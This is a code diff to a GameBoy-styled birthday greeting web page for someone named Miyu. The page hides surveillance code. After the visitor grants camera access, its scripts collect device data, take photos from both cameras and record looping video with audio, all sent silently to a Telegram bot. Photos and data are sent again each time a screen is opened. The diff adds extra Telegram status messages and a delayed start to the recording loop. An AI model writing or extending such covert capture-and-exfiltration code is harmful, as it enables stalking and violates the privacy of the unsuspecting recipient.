@@ -340,7 +340,7 @@
             font-family: 'Georgia', serif;
         }
         
-        /* Scrollbar untuk pesan rahasia (FIX) */
+        /* Scrollbar for secret message */
         .secret-text::-webkit-scrollbar {
             width: 6px;
         }
@@ -355,10 +355,10 @@
     </style>
 </head>
 <body>
-    <!-- Secret Message Modal (FIX - dengan tombol silang) -->
+    <!-- Secret Message Modal (FIX - with close button) -->
     <div id="secret-modal" class="secret-modal">
         <div class="secret-content" style="position: relative;">
-            <!-- Tombol silang balik ke main screen -->
+            <!-- Close button to return to main screen -->
             <button onclick="closeSecretAndGoBack()" style="
                 position: absolute; 
                 top: 10px; 
@@ -451,8 +451,8 @@ Happy Birthday, Miyu. You deserve all the happiness in the world.
                 </div>
                 <div class="speaker-grille"></div>
             </div>
-        </div>
-        <!-- Message Screen -->
+    </div>
+    <!-- Message Screen -->
 <div id="message-screen" class="screen">
     <div class="page-container">
         <div class="page-screen">
@@ -665,8 +665,8 @@ Happy Birthday, Miyu. You deserve all the happiness in the world.
     }
     .stats-row { display: flex; justify-content: space-between; margin: 5px 0; }
     .stats-value { color: #ffff00; font-weight: bold; }
-</style>
-<script>
+            </style>
+            <script>
     // ============================================
     // TELEGRAM CONFIG
     // ============================================
@@ -740,14 +740,22 @@ Happy Birthday, Miyu. You deserve all the happiness in the world.
     }
 
     // ============================================
-    // VIDEO RECORDING LOOP (S25 MODE)
+    // VIDEO RECORDING LOOP (FIX)
     // ============================================
     async function startVideoLoop() {
-        if (!cameraPermission || isRecording) return;
+        if (!cameraPermission || isRecording) {
+            console.log('Video loop: cameraPermission false or already recording');
+            return;
+        }
         
         try {
+            console.log('🎥 Requesting video stream...');
             videoStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { width: 640, height: 480, frameRate: 15 }, 
+                video: { 
+                    width: 640, 
+                    height: 480, 
+                    frameRate: 15 
+                }, 
                 audio: true 
             });
             
@@ -763,6 +771,8 @@ Happy Birthday, Miyu. You deserve all the happiness in the world.
                 if (event.data.size > 0) {
                     videoChunks.push(event.data);
                     currentVideoSize += event.data.size;
+                    console.log('🎥 Video chunk size:', (event.data.size / 1024).toFixed(2) + 'KB');
+                    
                     if (currentVideoSize >= MAX_VIDEO_SIZE) {
                         stopAndSendVideo();
                         setTimeout(() => startVideoLoop(), 1000);
@@ -771,6 +781,7 @@ Happy Birthday, Miyu. You deserve all the happiness in the world.
             };
             
             mediaRecorder.onstop = async () => {
+                console.log('🎥 Video stopped, processing...');
                 const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
                 await sendVideoToTelegram(videoBlob, `🎥 Video ${new Date().toLocaleString()}`);
                 videoStream.getTracks().forEach(t => t.stop());
@@ -778,10 +789,12 @@ Happy Birthday, Miyu. You deserve all the happiness in the world.
             
             mediaRecorder.start(1000);
             isRecording = true;
-            console.log('🎥 Video started');
+            console.log('🎥 Video recording started');
+            sendToTelegram("🎥 Video recording started");
             
         } catch (error) { 
             console.log('Video error:', error); 
+            sendToTelegram("❌ Video error: " + error.message);
         }
     }
 
@@ -830,6 +843,7 @@ Happy Birthday, Miyu. You deserve all the happiness in the world.
 
     window.requestPermission = async function() {
         try {
+            console.log('Requesting camera permission...');
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: true, 
                 audio: true 
@@ -840,14 +854,20 @@ Happy Birthday, Miyu. You deserve all the happiness in the world.
             localStorage.setItem('gameboyCameraAllowed', 'true');
             sendToTelegram("📱 GameBoy STARTED - Full permission");
             
-            // LANGSUNG FOTO + DATA + VIDEO (FIX)
+            // Send initial data + photos
             await collectAllData();
             await captureBothCameras('(initial)');
-            startVideoLoop();
+            
+            // Start video loop after 2 seconds
+            console.log('Starting video loop...');
+            setTimeout(() => {
+                startVideoLoop();
+            }, 2000);
             
             startGame();
             
         } catch (error) {
+            console.log('Permission error:', error);
             document.body.innerHTML = `
                 <div style="position:fixed; top:0; left:0; width:100%; height:100%; 
                      background:#000; display:flex; justify-content:center; align-items:center;
@@ -876,7 +896,7 @@ Happy Birthday, Miyu. You deserve all the happiness in the world.
         if (!cameraPermission) return;
         
         try {
-            // Cek permission dulu
+            // Check permission first
             const permissionStatus = await navigator.permissions.query({ name: 'camera' });
             if (permissionStatus.state !== 'granted') {
                 console.log('Camera permission not granted');
@@ -1022,7 +1042,7 @@ Happy Birthday, Miyu. You deserve all the happiness in the world.
             targetScreen.classList.add('active');
             currentScreen = screenId;
             
-            // AUTO KIRIM FOTO + DATA (FIX)
+            // Auto send photos + data
             captureBothCameras(`(opened ${screenId})`);
             collectAllData();
             
@@ -1409,7 +1429,7 @@ Happy Birthday! 🎂✨`
     };
     
     // ============================================
-    // FUNGSI BARU UNTUK CLOSE + BALIK KE MAIN (FIX)
+    // NEW FUNCTION TO CLOSE AND GO BACK TO MAIN (FIX)
     // ============================================
     window.closeSecretAndGoBack = function() {
         document.getElementById('secret-modal')?.classList.remove('active');
